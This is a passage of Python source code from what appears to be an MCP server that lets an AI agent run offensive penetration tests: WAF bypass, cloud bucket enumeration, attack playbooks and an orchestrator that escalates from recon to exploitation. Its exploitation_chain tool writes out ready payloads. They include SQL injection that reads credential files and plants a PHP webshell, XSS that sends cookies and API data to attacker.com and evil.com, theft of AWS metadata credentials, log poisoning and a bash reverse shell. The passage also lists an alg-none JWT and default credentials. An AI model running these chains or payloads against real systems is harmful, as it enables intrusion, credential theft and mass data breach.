        rl_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", url]
        rl_result = run_command_advanced(rl_cmd, timeout=8, trace=trace)
        if rl_result.get("stdout", "").strip() == "429":
            rate_limit_info = {"rate_limited_after": i + 1, "status": "429 detected"}
            break
    
    # Step 6: Summary
    progress.update("Complete")
    output = {
        "status": "success",
        "target": target,
        "waf_detected": waf_detected,
        "blocked_status": blocked_code,
        "total_bypasses_found": len(successful_bypasses),
        "successful_bypasses": successful_bypasses,
        "failed_techniques": len(failed_bypasses),
        "rate_limit": rate_limit_info,
        "severity": "CRITICAL" if successful_bypasses else "INFO",
        "recommendations": [
            f"WAF ({waf_detected}) has {len(successful_bypasses)} bypass vectors" if successful_bypasses
            else f"WAF ({waf_detected}) blocked all {len(failed_bypasses)} bypass attempts"
        ],
    }
    
    output = chain_engine.enrich_with_context("enhanced_waf_bypass", target, output)
    log_tool_execution("enhanced_waf_bypass", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def cloud_storage_enum(
    target: str,
    cloud_provider: str = "auto",
    custom_prefixes: str = "",
    timeout: int = 120
) -> str:
    """
    Cloud storage bucket/blob enumeration.
    Tests: AWS S3, Google Cloud Storage, Azure Blob Storage.
    Discovers: publicly accessible buckets, listing enabled, sensitive files exposed.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("cloud_storage_enum", target, 5)
    inputs = {"target": target, "cloud_provider": cloud_provider}
    
    domain = target.replace("https://", "").replace("http://", "").split("/")[0]
    base_name = domain.split(".")[0]
    findings = []
    
    # Generate bucket name variants
    progress.update("Generating bucket name variants")
    prefixes = [base_name]
    if custom_prefixes:
        prefixes.extend([p.strip() for p in custom_prefixes.split(",")])
    
    variants = []
    suffixes = ["", "-backup", "-bak", "-prod", "-production", "-staging", "-stage",
                "-dev", "-development", "-test", "-data", "-assets", "-static",
                "-uploads", "-media", "-logs", "-private", "-public", "-internal",
                "-archive", "-dump", "-export", "-db", "-database"]
    
    for prefix in prefixes:
        for suffix in suffixes:
            variants.append(f"{prefix}{suffix}")
    
    # Step 2: Test S3 buckets
    progress.update("Testing AWS S3 buckets")
    if cloud_provider in ["auto", "aws"]:
        for bucket in variants[:30]:
            s3_url = f"https://{bucket}.s3.amazonaws.com/"
            s3_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", s3_url]
            result = run_command_advanced(s3_cmd, timeout=8, trace=trace)
            status = result.get("stdout", "").strip()
            
            if status == "200":
                # Try to list contents
                list_cmd = ["curl", "-sk", "--max-time", "8", s3_url]
                list_result = run_command_advanced(list_cmd, timeout=12, trace=trace)
                has_listing = "<ListBucketResult" in list_result.get("stdout", "")
                findings.append({
                    "type": "S3_BUCKET_PUBLIC", "severity": "CRITICAL" if has_listing else "HIGH",
                    "bucket": bucket, "url": s3_url, "listing_enabled": has_listing,
                    "detail": f"Public S3 bucket: {bucket}" + (" (LISTING ENABLED!)" if has_listing else "")
                })
            elif status == "403":
                findings.append({
                    "type": "S3_BUCKET_EXISTS", "severity": "LOW",
                    "bucket": bucket, "detail": f"S3 bucket exists but access denied: {bucket}"
                })
    
    # Step 3: Test GCS buckets
    progress.update("Testing Google Cloud Storage")
    if cloud_provider in ["auto", "gcp"]:
        for bucket in variants[:20]:
            gcs_url = f"https://storage.googleapis.com/{bucket}/"
            gcs_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", gcs_url]
            result = run_command_advanced(gcs_cmd, timeout=8, trace=trace)
            status = result.get("stdout", "").strip()
            
            if status == "200":
                findings.append({
                    "type": "GCS_BUCKET_PUBLIC", "severity": "CRITICAL",
                    "bucket": bucket, "url": gcs_url,
                    "detail": f"Public GCS bucket: {bucket}"
                })
    
    # Step 4: Test Azure Blob Storage
    progress.update("Testing Azure Blob Storage")
    if cloud_provider in ["auto", "azure"]:
        for bucket in variants[:20]:
            azure_url = f"https://{bucket}.blob.core.windows.net/?comp=list"
            azure_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", azure_url]
            result = run_command_advanced(azure_cmd, timeout=8, trace=trace)
            status = result.get("stdout", "").strip()
            
            if status == "200":
                findings.append({
                    "type": "AZURE_BLOB_PUBLIC", "severity": "CRITICAL",
                    "container": bucket, "url": azure_url,
                    "detail": f"Public Azure Blob container: {bucket}"
                })
    
    progress.update("Complete")
    output = {
        "status": "success",
        "target": target,
        "domain": domain,
        "variants_tested": len(variants[:30]),
        "total_findings": len(findings),
        "public_buckets": [f for f in findings if "PUBLIC" in f.get("type", "")],
        "existing_buckets": [f for f in findings if "EXISTS" in f.get("type", "")],
        "all_findings": findings,
    }
    
    output = chain_engine.enrich_with_context("cloud_storage_enum", target, output)
    log_tool_execution("cloud_storage_enum", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def exploitation_chain(
    target: str,
    chain_type: str = "auto",
    timeout: int = 180
) -> str:
    """
    Automatic exploitation chain builder. Analyzes prior tool results and builds
    exploitation chains:
    - SSRF + AWS metadata → credential extraction
    - SQLi + file read → source code disclosure
    - IDOR + API → mass data dump strategy
    - XSS + CORS → session hijack chain
    - LFI + log poisoning → RCE
    Chain types: auto, ssrf_to_creds, sqli_to_rce, idor_to_dump, xss_to_takeover, lfi_to_rce
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("exploitation_chain", target, 6)
    inputs = {"target": target, "chain_type": chain_type}
    
    # Step 1: Gather context from prior tool runs
    progress.update("Gathering context from tool chain")
    context = chain_engine.get_target_context(target) if hasattr(chain_engine, 'get_target_context') else {}
    
    # Analyze available data
    has_ssrf = any("ssrf" in str(v).lower() for v in context.values()) if context else False
    has_sqli = any("sqli" in str(v).lower() or "sql_injection" in str(v).lower() for v in context.values()) if context else False
    has_idor = any("idor" in str(v).lower() for v in context.values()) if context else False
    has_xss = any("xss" in str(v).lower() for v in context.values()) if context else False
    has_lfi = any("lfi" in str(v).lower() for v in context.values()) if context else False
    has_cors = any("cors" in str(v).lower() for v in context.values()) if context else False
    
    chains = []
    
    # Step 2: Build exploitation chains
    progress.update("Building exploitation chains")
    
    if chain_type in ["auto", "ssrf_to_creds"] and (has_ssrf or chain_type == "ssrf_to_creds"):
        chains.append({
            "name": "SSRF → AWS Credential Extraction",
            "severity": "CRITICAL",
            "steps": [
                {"step": 1, "action": "Confirm SSRF via enhanced_ssrf_scanner",
                 "target": "Identified SSRF parameter"},
                {"step": 2, "action": "Access http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                 "target": "AWS metadata service"},
                {"step": 3, "action": "Extract AccessKeyId, SecretAccessKey, Token",
                 "target": "IAM role credentials"},
                {"step": 4, "action": "Use aws-cli with extracted credentials",
                 "command": "aws sts get-caller-identity"},
                {"step": 5, "action": "Enumerate S3, EC2, Lambda access",
                 "command": "aws s3 ls / aws ec2 describe-instances"},
            ],
            "impact": "Full AWS account compromise via SSRF → IAM credential theft",
            "prereqs": ["Confirmed SSRF vulnerability", "AWS infrastructure"],
        })
    
    if chain_type in ["auto", "sqli_to_rce"] and (has_sqli or chain_type == "sqli_to_rce"):
        chains.append({
            "name": "SQLi → File Read → Source Disclosure → RCE",
            "severity": "CRITICAL",
            "steps": [
                {"step": 1, "action": "Confirm SQLi via sqlmap_scan or sql_injection_test",
                 "target": "Injectable parameter"},
                {"step": 2, "action": "Read sensitive files via LOAD_FILE()",
                 "payload": "' UNION SELECT LOAD_FILE('/etc/passwd')--"},
                {"step": 3, "action": "Read application config for DB credentials",
                 "payload": "' UNION SELECT LOAD_FILE('/var/www/html/.env')--"},
                {"step": 4, "action": "Write webshell via INTO OUTFILE",
                 "payload": "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'--"},
                {"step": 5, "action": "Execute commands via webshell",
                 "command": "curl target.com/shell.php?c=whoami"},
            ],
            "impact": "Full Remote Code Execution via SQL Injection chain",
            "prereqs": ["Confirmed SQL injection", "FILE privilege on DB user"],
        })
    
    if chain_type in ["auto", "idor_to_dump"] and (has_idor or chain_type == "idor_to_dump"):
        chains.append({
            "name": "IDOR → Mass Data Extraction",
            "severity": "HIGH",
            "steps": [
                {"step": 1, "action": "Confirm IDOR via enhanced_idor_scanner",
                 "target": "Vulnerable endpoint with sequential/predictable IDs"},
                {"step": 2, "action": "Enumerate valid IDs (sequential, UUID patterns)",
                 "detail": "Iterate through ID range: 1-10000"},
                {"step": 3, "action": "Extract data for each valid ID",
                 "command": "for i in $(seq 1 10000); do curl -s 'target.com/api/users/$i'; done"},
                {"step": 4, "action": "Parse and aggregate extracted data",
                 "detail": "Combine all responses into structured dataset"},
                {"step": 5, "action": "Identify high-value targets (admin, PII)",
                 "detail": "Filter for admin roles, emails, phone numbers"},
            ],
            "impact": "Mass data breach via IDOR - all user data accessible",
            "prereqs": ["Confirmed IDOR vulnerability", "Predictable ID pattern"],
        })
    
    if chain_type in ["auto", "xss_to_takeover"] and (has_xss or has_cors or chain_type == "xss_to_takeover"):
        chains.append({
            "name": "XSS + CORS → Account Takeover",
            "severity": "CRITICAL",
            "steps": [
                {"step": 1, "action": "Confirm stored/reflected XSS",
                 "target": "XSS injection point"},
                {"step": 2, "action": "Craft credential-stealing payload",
                 "payload": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"},
                {"step": 3, "action": "If CORS misconfigured, exploit cross-origin",
                 "detail": "Host payload on attacker domain, steal authenticated API data"},
                {"step": 4, "action": "Steal session tokens / JWT",
                 "payload": "<script>fetch('/api/me').then(r=>r.json()).then(d=>fetch('https://evil.com/?d='+btoa(JSON.stringify(d))))</script>"},
                {"step": 5, "action": "Replay stolen tokens for account takeover",
                 "command": "curl -H 'Authorization: Bearer STOLEN_TOKEN' target.com/api/admin"},
            ],
            "impact": "Full account takeover via XSS → session theft → impersonation",
            "prereqs": ["Confirmed XSS", "Session tokens in cookies/localStorage"],
        })
    
    if chain_type in ["auto", "lfi_to_rce"] and (has_lfi or chain_type == "lfi_to_rce"):
        chains.append({
            "name": "LFI + Log Poisoning → RCE",
            "severity": "CRITICAL",
            "steps": [
                {"step": 1, "action": "Confirm LFI via lfi_scan",
                 "target": "File inclusion parameter"},
                {"step": 2, "action": "Identify readable log files",
                 "paths": ["/var/log/apache2/access.log", "/var/log/nginx/access.log"]},
                {"step": 3, "action": "Poison log with PHP code via User-Agent",
                 "command": "curl -A '<?php system($_GET[c]);?>' target.com"},
                {"step": 4, "action": "Include poisoned log via LFI",
                 "payload": "?file=../../../var/log/apache2/access.log&c=whoami"},
                {"step": 5, "action": "Escalate to reverse shell",
                 "command": "?file=../../../var/log/apache2/access.log&c=bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'"},
            ],
            "impact": "Remote Code Execution via LFI + log poisoning",
            "prereqs": ["Confirmed LFI", "Readable log files", "PHP execution context"],
        })
    
    # Step 3: Generate if no chains from context
    if not chains:
        progress.update("Generating default chains")
        chains.append({
            "name": "Recommended First Steps",
            "severity": "INFO",
            "steps": [
                {"step": 1, "action": "Run target_profiler to identify stack"},
                {"step": 2, "action": "Run context_fuzzer to discover endpoints"},
                {"step": 3, "action": "Run smart_vulnerability_detector for quick wins"},
                {"step": 4, "action": "Run specific scanners based on findings"},
                {"step": 5, "action": "Re-run exploitation_chain with confirmed vulns"},
            ],
            "impact": "Need to discover vulnerabilities first",
            "prereqs": ["Run reconnaissance tools first"],
        })
    
    progress.update("Complete")
    output = {
        "status": "success",
        "target": target,
        "chain_type": chain_type,
        "chains_generated": len(chains),
        "exploitation_chains": chains,
        "context_available": {
            "ssrf": has_ssrf, "sqli": has_sqli, "idor": has_idor,
            "xss": has_xss, "lfi": has_lfi, "cors": has_cors,
        },
        "recommendation": "Execute chains in order of severity (CRITICAL first)",
    }
    
    output = chain_engine.enrich_with_context("exploitation_chain", target, output)
    log_tool_execution("exploitation_chain", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)



# ============================================================================
# MAIN ENTRY POINT
# ============================================================================


# ============================================================================
# INTELLIGENT ORCHESTRATION ENGINE — Autonomous Pentest Brain
# ============================================================================

class PentestMemory:
    """
    Contextual memory system that retains findings across tool calls.
    Enables intelligent decision-making based on accumulated knowledge.
    """
    
    def __init__(self):
        self._memory: Dict[str, Dict] = {}  # target → accumulated findings
        self._decisions: List[Dict] = []  # decision log
        self._rate_limits: Dict[str, Dict] = {}  # target → rate limit info
    
    def store_finding(self, target: str, tool: str, finding_type: str, data: Any):
        """Store a finding for later cross-reference."""
        if target not in self._memory:
            self._memory[target] = {
                "stack": {}, "ports": [], "services": [], "vulns": [],
                "endpoints": [], "responses": {}, "headers": {},
                "cloud": {}, "waf": None, "technologies": [],
                "rate_limits": {}, "bypass_successes": [],
            }
        
        mem = self._memory[target]
        if finding_type == "port":
            if data not in mem["ports"]:
                mem["ports"].append(data)
        elif finding_type == "service":
            mem["services"].append(data)
        elif finding_type == "vuln":
            mem["vulns"].append({"tool": tool, "data": data, "timestamp": time.time()})
        elif finding_type == "endpoint":
            if data not in mem["endpoints"]:
                mem["endpoints"].append(data)
        elif finding_type == "response_code":
            endpoint, code = data
            mem["responses"][endpoint] = code
        elif finding_type == "stack":
            mem["stack"].update(data)
        elif finding_type == "technology":
            if data not in mem["technologies"]:
                mem["technologies"].append(data)
        elif finding_type == "cloud":
            mem["cloud"].update(data)
        elif finding_type == "waf":
            mem["waf"] = data
        elif finding_type == "header":
            mem["headers"].update(data)
        elif finding_type == "rate_limit":
            mem["rate_limits"].update(data)
        elif finding_type == "bypass_success":
            mem["bypass_successes"].append(data)
    
    def get_context(self, target: str) -> Dict:
        """Get full accumulated context for a target."""
        return self._memory.get(target, {})
    
    def get_stack(self, target: str) -> Dict:
        """Get detected technology stack."""
        return self._memory.get(target, {}).get("stack", {})
    
    def get_vulns(self, target: str) -> List:
        """Get all discovered vulnerabilities."""
        return self._memory.get(target, {}).get("vulns", [])
    
    def has_finding(self, target: str, finding_type: str, keyword: str = "") -> bool:
        """Check if a specific finding exists."""
        mem = self._memory.get(target, {})
        if finding_type == "waf":
            return mem.get("waf") is not None
        if finding_type == "cloud":
            return bool(mem.get("cloud"))
        data = mem.get(finding_type, [])
        if keyword:
            return any(keyword.lower() in str(item).lower() for item in data)
        return bool(data)
    
    def decide(self, target: str, decision: str, reason: str):
        """Log a strategic decision for audit trail."""
        self._decisions.append({
            "target": target, "decision": decision,
            "reason": reason, "timestamp": time.time()
        })
    
    def get_decisions(self, target: str) -> List[Dict]:
        """Get decision trail for a target."""
        return [d for d in self._decisions if d["target"] == target]


class PlaybookEngine:
    """
    Pre-defined attack playbooks that auto-chain tools based on context.
    Each playbook is a decision tree that adapts to findings.
    """
    
    PLAYBOOKS = {
        "web_full": {
            "name": "Full Web Application Assessment",
            "description": "Complete web pentest: recon → fingerprint → fuzz → inject → exploit",
            "stages": [
                {"name": "recon", "tools": ["nmap_scan", "web_tech_detect", "target_profiler"]},
                {"name": "discovery", "tools": ["gobuster_scan", "enhanced_api_discovery", "subdomain_enum"]},
                {"name": "analysis", "tools": ["enhanced_cors_scanner", "enhanced_waf_bypass", "header_security_audit"]},
                {"name": "fuzzing", "tools": ["context_fuzzer", "smart_vulnerability_detector"]},
                {"name": "injection", "tools": ["sql_injection_test", "xss_scan", "ssti_scanner", "ssrf_scanner"]},
                {"name": "exploit", "tools": ["exploitation_chain"]},
            ],
        },
        "api_assessment": {
            "name": "API Security Assessment",
            "description": "API-focused: discovery → auth testing → injection → IDOR → SSRF",
            "stages": [
                {"name": "discovery", "tools": ["enhanced_api_discovery", "target_profiler"]},
                {"name": "auth", "tools": ["enhanced_jwt_analyzer", "enhanced_idor_scanner"]},
                {"name": "injection", "tools": ["sql_injection_test", "command_injection_test"]},
                {"name": "ssrf", "tools": ["enhanced_ssrf_scanner"]},
                {"name": "exploit", "tools": ["exploitation_chain"]},
            ],
        },
        "cloud_assessment": {
            "name": "Cloud Infrastructure Assessment",
            "description": "Cloud-focused: enum → storage → SSRF → metadata → takeover",
            "stages": [
                {"name": "recon", "tools": ["nmap_scan", "target_profiler"]},
                {"name": "cloud_enum", "tools": ["cloud_storage_enum"]},
                {"name": "ssrf", "tools": ["enhanced_ssrf_scanner"]},
                {"name": "exploit", "tools": ["exploitation_chain"]},
            ],
        },
        "network_internal": {
            "name": "Internal Network Assessment",
            "description": "Network pentest: discovery → services → SMB → exploit",
            "stages": [
                {"name": "discovery", "tools": ["advanced_arp_discovery", "nmap_scan"]},
                {"name": "services", "tools": ["advanced_smb_enum"]},
                {"name": "brute", "tools": ["hydra_attack"]},
                {"name": "exploit", "tools": ["metasploit_exploit"]},
            ],
        },
        "bug_bounty_quick": {
            "name": "Bug Bounty Quick Assessment",
            "description": "Fast bug bounty: subdomains → tech detect → CORS/SSRF/IDOR → report",
            "stages": [
                {"name": "scope", "tools": ["scope_check", "subdomain_enum"]},
                {"name": "fingerprint", "tools": ["target_profiler", "web_tech_detect"]},
                {"name": "vulns", "tools": ["enhanced_cors_scanner", "enhanced_ssrf_scanner", "enhanced_idor_scanner", "enhanced_jwt_analyzer"]},
                {"name": "report", "tools": ["generate_report"]},
            ],
        },
    }
    
    @classmethod
    def get_playbook(cls, name: str) -> Dict:
        """Get a playbook by name."""
        return cls.PLAYBOOKS.get(name, {})
    
    @classmethod
    def list_playbooks(cls) -> List[str]:
        """List available playbooks."""
        return list(cls.PLAYBOOKS.keys())
    
    @classmethod
    def recommend_playbook(cls, context: Dict) -> str:
        """Recommend a playbook based on current context."""
        stack = context.get("stack", {})
        ports = context.get("ports", [])
        cloud = context.get("cloud", {})
        
        # Cloud detected → cloud assessment
        if cloud.get("provider"):
            return "cloud_assessment"
        
        # Only internal ports (445, 139, 3389) → network internal
        internal_indicators = {445, 139, 3389, 22, 23, 3306, 5432}
        if ports and all(p in internal_indicators for p in ports):
            return "network_internal"
        
        # API detected → API assessment
        if stack.get("api_type") or stack.get("framework") in ["fastapi", "express", "spring"]:
            return "api_assessment"
        
        # Web ports → full web
        if any(p in [80, 443, 8080, 8443] for p in ports):
            return "web_full"
        
        return "bug_bounty_quick"


class RateLimitDetector:
    """
    Detects rate limiting and adapts scan speed dynamically.
    Monitors response patterns to identify throttling.
    """
    
    def __init__(self):
        self._limits: Dict[str, Dict] = {}
        self._request_log: Dict[str, List[float]] = {}
    
    def log_request(self, target: str):
        """Log a request timestamp."""
        if target not in self._request_log:
            self._request_log[target] = []
        self._request_log[target].append(time.time())
        # Keep last 100 timestamps
        self._request_log[target] = self._request_log[target][-100:]
    
    def detect_from_response(self, target: str, status_code: int, headers: Dict) -> Dict:
        """Analyze response for rate limit indicators."""
        indicators = {
            "rate_limited": False,
            "limit": None,
            "remaining": None,
            "reset_time": None,
            "retry_after": None,
            "type": "unknown",
        }
        
        # HTTP 429 → explicit rate limit
        if status_code == 429:
            indicators["rate_limited"] = True
            indicators["type"] = "explicit_429"
        
        # Check rate limit headers
        for key, val in headers.items():
            key_lower = key.lower()
            if "x-ratelimit-limit" in key_lower or "x-rate-limit-limit" in key_lower:
                indicators["limit"] = int(val) if val.isdigit() else val
            elif "x-ratelimit-remaining" in key_lower or "x-rate-limit-remaining" in key_lower:
                indicators["remaining"] = int(val) if val.isdigit() else val
            elif "x-ratelimit-reset" in key_lower or "x-rate-limit-reset" in key_lower:
                indicators["reset_time"] = val
            elif "retry-after" in key_lower:
                indicators["retry_after"] = int(val) if val.isdigit() else val
                indicators["rate_limited"] = True
                indicators["type"] = "retry_after"
        
        # Cloudflare rate limit patterns
        if status_code == 403 and any("cloudflare" in str(v).lower() for v in headers.values()):
            indicators["rate_limited"] = True
            indicators["type"] = "cloudflare_block"
        
        # AWS WAF rate limit (status 403 with specific headers)
        if status_code == 403 and any("awselb" in str(v).lower() or "awsalb" in str(v).lower() for v in headers.values()):
            indicators["rate_limited"] = True
            indicators["type"] = "aws_waf"
        
        # Store findings
        if indicators["rate_limited"] or indicators["limit"]:
            self._limits[target] = indicators
        
        return indicators
    
    def get_recommended_delay(self, target: str) -> float:
        """Get recommended delay between requests for a target."""
        limit_info = self._limits.get(target, {})
        
        if limit_info.get("retry_after"):
            return float(limit_info["retry_after"])
        
        if limit_info.get("type") == "cloudflare_block":
            return 5.0  # Cloudflare needs longer cooldown
        
        if limit_info.get("type") == "aws_waf":
            return 3.0
        
        if limit_info.get("limit"):
            # Calculate safe request rate
            limit = limit_info["limit"]
            if isinstance(limit, int) and limit > 0:
                return max(0.5, 60.0 / limit)  # Stay at 80% of limit
        
        # Default: adaptive based on response pattern
        timestamps = self._request_log.get(target, [])
        if len(timestamps) > 10:
            # If requests are clustered, slow down
            recent = timestamps[-10:]
            time_span = recent[-1] - recent[0]
            if time_span < 2.0:  # 10 requests in 2 seconds = too fast
                return 1.0
        
        return 0.3  # Default moderate pace
    
    def is_rate_limited(self, target: str) -> bool:
        """Check if target is currently rate limiting us."""
        return self._limits.get(target, {}).get("rate_limited", False)
    
    def get_status(self, target: str) -> Dict:
        """Get full rate limit status for a target."""
        return {
            "limits": self._limits.get(target, {}),
            "total_requests": len(self._request_log.get(target, [])),
            "recommended_delay": self.get_recommended_delay(target),
            "is_limited": self.is_rate_limited(target),
        }


class IntelligentOrchestrator:
    """
    The brain of the MCP server. Makes autonomous decisions about:
    - What to scan next based on findings
    - How to adapt to rate limits and WAFs
    - When to escalate from recon to exploitation
    - Which payloads to use based on detected stack
    """
    
    def __init__(self, memory: PentestMemory, rate_detector: RateLimitDetector):
        self.memory = memory
        self.rate_detector = rate_detector
    
    def analyze_response_code(self, target: str, endpoint: str, code: int) -> List[Dict]:
        """
        Contextual analysis of HTTP response codes.
        Returns recommended follow-up actions.
        """
        actions = []
        
        if code == 405:
            # Method Not Allowed → endpoint EXISTS but wrong method
            actions.append({
                "action": "method_enum",
                "reason": f"{endpoint} returned 405 — endpoint exists, try alternate methods",
                "methods": ["POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
                "headers_to_try": [
                    {"Content-Type": "application/json", "body": "{}"},
                    {"Content-Type": "application/x-www-form-urlencoded"},
                    {"Content-Type": "multipart/form-data"},
                ],
            })
            self.memory.store_finding(target, "orchestrator", "endpoint", endpoint)
        
        elif code == 422:
            # Unprocessable Entity → expects specific body format (common in Java/Spring/FastAPI)
            actions.append({
                "action": "body_fuzz",
                "reason": f"{endpoint} returned 422 — expects structured body, fuzz parameters",
                "payloads": [
                    '{"username":"admin","password":"admin"}',
                    '{"email":"test@test.com"}',
                    '{"id":1}',
                    '{"query":"test"}',
                    '{"data":null}',
                ],
                "stack_hint": "Likely Spring Boot / FastAPI / NestJS",
            })
            self.memory.store_finding(target, "orchestrator", "stack", {"body_format": "json", "validation": "strict"})
        
        elif code == 403:
            # Forbidden → try bypass techniques
            actions.append({
                "action": "bypass_403",
                "reason": f"{endpoint} returned 403 — try bypass techniques",
                "techniques": [
                    {"header": "X-Original-URL", "value": endpoint},
                    {"header": "X-Rewrite-URL", "value": endpoint},
                    {"header": "X-Forwarded-For", "value": "127.0.0.1"},
                    {"header": "X-Custom-IP-Authorization", "value": "127.0.0.1"},
                    {"path_mutation": endpoint + "/"},
                    {"path_mutation": endpoint + "/..;/"},
                    {"path_mutation": "/" + endpoint.strip("/").upper()},
                    {"path_mutation": endpoint + "%20"},
                    {"path_mutation": endpoint + "%0a"},
                    {"path_mutation": endpoint + "?"},
                    {"path_mutation": endpoint + "#"},
                    {"path_mutation": endpoint + "..;"},
                ],
            })
        
        elif code == 401:
            # Unauthorized → authentication required, try defaults + bypass
            actions.append({
                "action": "auth_bypass",
                "reason": f"{endpoint} returned 401 — try default creds and auth bypass",
                "techniques": [
                    {"type": "basic_auth", "creds": ["admin:admin", "admin:password", "root:root"]},
                    {"type": "jwt_none", "header": "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0."},
                    {"type": "header_bypass", "headers": ["X-API-Key: test", "Authorization: null"]},
                ],
            })
        
        elif code == 500:
            # Internal Server Error → potential injection point
            actions.append({
                "action": "error_exploit",
                "reason": f"{endpoint} returned 500 — server error, possible injection point",
                "tests": ["sqli", "ssti", "command_injection", "deserialization"],
            })
        
        elif code == 301 or code == 302:
            # Redirect → follow and analyze destination
            actions.append({
                "action": "follow_redirect",
                "reason": f"{endpoint} redirects — follow to discover hidden endpoints",
            })
        
        return actions
    
    def recommend_next_tools(self, target: str) -> List[Dict]:
        """
        Based on accumulated memory, recommend next tools to run.
        This is the core intelligence function.
        """
        context = self.memory.get_context(target)
        if not context:
            return [{"tool": "target_profiler", "reason": "No context yet — start with profiling"}]
        
        recommendations = []
        stack = context.get("stack", {})
        vulns = context.get("vulns", [])
        waf = context.get("waf")
        cloud = context.get("cloud", {})
        endpoints = context.get("endpoints", [])
        responses = context.get("responses", {})
        
        # If WAF detected but no bypass attempted
        if waf and not context.get("bypass_successes"):
            recommendations.append({
                "tool": "enhanced_waf_bypass",
                "reason": f"WAF detected ({waf}) but no bypass attempted",
                "priority": "high",
            })
        
        # If cloud provider detected but storage not enumerated
        if cloud.get("provider") and not self.memory.has_finding(target, "vulns", "s3"):
            recommendations.append({
                "tool": "cloud_storage_enum",
                "reason": f"Cloud provider {cloud.get('provider')} detected — enumerate storage",
                "priority": "high",
            })
        
        # If Java/Spring detected → test Spring-specific vulns
        if stack.get("framework") in ["spring", "spring_boot"]:
            if not self.memory.has_finding(target, "endpoints", "actuator"):
                recommendations.append({
                    "tool": "smart_vulnerability_detector",
                    "reason": "Spring Boot detected — test /actuator, Log4Shell, deserial",
                    "priority": "critical",
                    "params": {"scan_type": "full"},
                })
        
        # If 403s found but no bypass tested
        forbidden_endpoints = [ep for ep, code in responses.items() if code == 403]
        if forbidden_endpoints:
            recommendations.append({
                "tool": "context_fuzzer",
                "reason": f"Found {len(forbidden_endpoints)} 403 endpoints — test bypass techniques",
                "priority": "high",
                "params": {"wordlist_type": "bypass"},
            })
        
        # If vulns found but no exploitation chain built
        if len(vulns) >= 2 and not self.memory.has_finding(target, "vulns", "chain"):
            recommendations.append({
                "tool": "exploitation_chain",
                "reason": f"{len(vulns)} vulnerabilities found — build exploitation chain",
                "priority": "critical",
            })
        
        # If APIs discovered but not tested for IDOR
        if endpoints and not self.memory.has_finding(target, "vulns", "idor"):
            recommendations.append({
                "tool": "enhanced_idor_scanner",
                "reason": "API endpoints discovered — test for IDOR",
                "priority": "medium",
            })
        
        # If no SSRF test done yet
        if not self.memory.has_finding(target, "vulns", "ssrf"):
            recommendations.append({
                "tool": "enhanced_ssrf_scanner",
                "reason": "SSRF not yet tested — critical for cloud environments",
                "priority": "medium",
            })
        
        # Sort by priority
        priority_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        recommendations.sort(key=lambda x: priority_order.get(x.get("priority", "low"), 3))
        
        return recommendations[:5]  # Top 5 recommendations
    
    def adapt_to_stack(self, target: str) -> Dict:
        """
        Adapt testing strategy based on detected technology stack.
        Returns stack-specific configuration.
        """
        stack = self.memory.get_stack(target)
        config = {
            "wordlists": [],
            "payloads": [],
            "priority_tests": [],
            "skip_tests": [],
        }
        
        framework = stack.get("framework", "").lower()
        language = stack.get("language", "").lower()
        cloud_provider = self.memory.get_context(target).get("cloud", {}).get("provider", "")
        
        if "spring" in framework or "java" in language:
            config["wordlists"].extend([
                "/actuator", "/actuator/env", "/actuator/health", "/actuator/info",
                "/actuator/mappings", "/actuator/beans", "/actuator/configprops",
                "/swagger-ui.html", "/v2/api-docs", "/v3/api-docs",
                "/h2-console", "/jolokia", "/heapdump",
            ])
            config["payloads"].extend(["log4shell", "java_deserial", "spring_spel"])
            config["priority_tests"].extend(["ssti_scanner", "command_injection_test"])
        
        elif "go" in language or "golang" in framework:
            config["wordlists"].extend([
                "/debug/pprof/", "/debug/vars", "/metrics",
                "/healthz", "/readyz", "/livez",
                "/swagger/", "/api-docs/",
            ])
            config["payloads"].extend(["ssti_golang", "path_traversal"])
            config["priority_tests"].extend(["ssti_scanner", "lfi_scan"])
        
        elif "node" in language or "express" in framework:
            config["wordlists"].extend([
                "/.env", "/package.json", "/node_modules/.package-lock.json",
                "/graphql", "/__graphql", "/playground",
                "/server.js", "/app.js", "/config.js",
            ])
            config["payloads"].extend(["nosql_injection", "prototype_pollution", "ssrf"])
            config["priority_tests"].extend(["ssrf_scanner", "command_injection_test"])
        
        elif "python" in language or "django" in framework or "flask" in framework or "fastapi" in framework:
            config["wordlists"].extend([
                "/admin/", "/api/schema/", "/__debug__/", "/docs", "/redoc",
                "/openapi.json", "/.env", "/settings.py",
                "/manage.py", "/requirements.txt",
            ])
            config["payloads"].extend(["ssti_jinja2", "python_deserial", "ssrf"])
            config["priority_tests"].extend(["ssti_scanner", "ssrf_scanner"])
        
        elif "php" in language or "laravel" in framework or "wordpress" in framework:
            config["wordlists"].extend([
                "/wp-admin/", "/wp-config.php.bak", "/.env",
                "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "/debug/default/view", "/telescope/requests",
            ])
            config["payloads"].extend(["php_object_injection", "lfi", "rce_php"])
            config["priority_tests"].extend(["lfi_scan", "command_injection_test"])
        
        # Cloud-specific
        if cloud_provider == "aws":
            config["wordlists"].extend([
                "/.aws/credentials", "/.aws/config",
                "/latest/meta-data/", "/latest/user-data",
            ])
            config["priority_tests"].append("enhanced_ssrf_scanner")
        elif cloud_provider == "gcp":
            config["wordlists"].extend([
                "/computeMetadata/v1/", "/computeMetadata/v1/project/",
            ])
        elif cloud_provider == "azure":
            config["wordlists"].extend([
                "/metadata/instance", "/.azure/",
            ])
        
        return config


# Initialize global intelligence instances
